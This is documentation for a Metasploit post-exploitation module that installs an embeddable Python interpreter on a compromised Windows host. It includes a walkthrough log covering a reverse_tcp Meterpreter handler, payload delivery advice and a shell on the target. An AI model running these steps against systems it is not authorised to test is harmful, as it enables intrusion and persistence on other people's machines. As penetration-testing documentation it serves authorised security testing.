## Overview

This module downloads an embeddable Python3 distribution onto the target
file system, granting pentesters access to a lightweight Python
interpreter. This module does not require administrative privileges or
user interaction with installation prompts.
This is useful in cases where the in-memory python interpreter might
be limited.  If you only want to run a python script while connected,
see https://github.com/rapid7/metasploit-framework/wiki/Python-Extension.

## Tested Version
This module has been tested against:

1. Windows 10, 1903

## Verification Steps

  1. Start msfconsole
  2. Get a Meterpreter session
  3. Do: `use post/windows/manage/install_python`
  4. Do: `set SESSION #`
  5. Optional Do: `set PYTHON_VERSION`
  6. Optional Do: `set PYTHON_URL`
  7. Optional Do: `set FILE_PATH`
  8. Do: `run`


## Options
  **PYTHON_VERSION**

  Specifies the Python version you would like to download. Downloads Python version 3.8.2 by default.

  **PYTHON_URL**

  Specifies the URL used to download the Python embeddable zip file.

  **FILE_PATH**

  Specifies the directory to place the Python embeddable zip file.
  Places Python zip file in the current working directory by default.

  **CLEANUP**

  If true, this option will delete the Python zip file as well as its extracted contents. It will also terminate running processes with name 'python', as you cannot delete the Python interpreter if it is actively running.

## Scenarios

Get initial access: Create a Meterpreter exe using msfvenom, then transfer it to the target system via web server, SMB, etc. Execute the payload to get a session.

    msf5 > handler -H 0.0.0.0 -P 4444 -p windows/meterpreter/reverse_tcp
    [*] Payload handler running as background job 0.

    [*] Started reverse TCP handler on 0.0.0.0:4444 
    msf5 > 
    [*] Sending stage (180291 bytes) to 192.168.13.129
    [*] Meterpreter session 1 opened (192.168.13.130:4444 -> 192.168.13.129:50069) at 2020-03-04 20:32:59 -0500

Use the post module to install Python on the target filesystem

    msf5 > use post/windows/manage/install_python 
    msf5 post(windows/manage/install_python) > set SESSION 1
    SESSION => 1
    msf5 post(windows/manage/install_python) > exploit 

    [*] Downloading Python embeddable zip from https://www.python.org/ftp/python/3.8.2/python-3.8.2-embed-win32.zip
    [+] Compressed size: 1112
    [*] Extracting Python zip file: .\python-3.8.2-embed-win32.zip
    [+] Compressed size: 952
    [*] Ready to execute Python; spawn a command shell and enter:
    [+] .\python-3.8.2-embed-win32\python.exe -c "print('Hello, world!')"
    [!] Avoid using this python.exe interactively, as it will likely hang your terminal; use script files or 1 liners instead
    [*] Post module execution completed

Verify Python works

    msf5 post(windows/manage/install_python) > sessions -i 1 
    [*] Starting interaction with 1...

    meterpreter > shell
    Process 2688 created.
    Channel 5 created.
    Microsoft Windows [Version 10.0.17763.1039]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Users\buddha\AppData\Local\Temp>.\python-3.8.2-embed-win32\python.exe -c "print('Hello, world!')"
    .\python-3.8.2-embed-win32\python.exe -c "print('Hello, world!')"
    Hello, world!

Note that running this Python interpreter interactively may hang your command shell.
